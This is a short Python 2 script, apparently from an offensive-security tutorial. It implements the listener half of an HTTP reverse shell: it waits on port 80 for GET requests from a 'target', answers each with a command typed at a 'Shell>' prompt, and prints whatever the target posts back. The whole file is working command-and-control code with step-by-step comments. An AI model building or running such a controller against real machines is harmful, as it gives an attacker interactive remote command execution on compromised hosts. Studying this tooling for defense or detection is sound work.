# basic HTTP server_class

import BaseHTTPServer

# host IP & listening port
HOST_NAME = '192.168.100.187'
PORT_NUMBER = 80

# MyHandler defines what we should do when we receive a GET/POST request from client / target
class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):
        # if we got a GET request, we will take user input
        command = raw_input("Shell> ")
        # return HTML status 200 (OK)
        s.send_response(200)
        # inform target that content type header is "text/html"
        s.send_header("Content-type", "text/html")
        s.end_headers()
        # send the command which we got from the user input
        s.wfile.write(command)

    def do_POST(s):
        # if we got a POST, we will return HTML status 200 (OK)
        s.send_response(200)
        s.end_headers()
        # define the length which means how many bytes the HTTP POST data contains, value has to be integer
        length = int(s.headers['Content-Length'])
        # read then print the posted data
        postVar = s.rfile.read(length)
        print postVar


if __name__ == '__main__':

    # we start a server_class and create httpd object and pass our IP+Port and class handler (MyHandler)
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        # start the HTTP server, if we get CTRL+C we will interrupt and stop the server
        httpd.serve_forever()
    except KeyboardInterrupt:
        print '[!] Server is terminated'
        httpd.server_close()
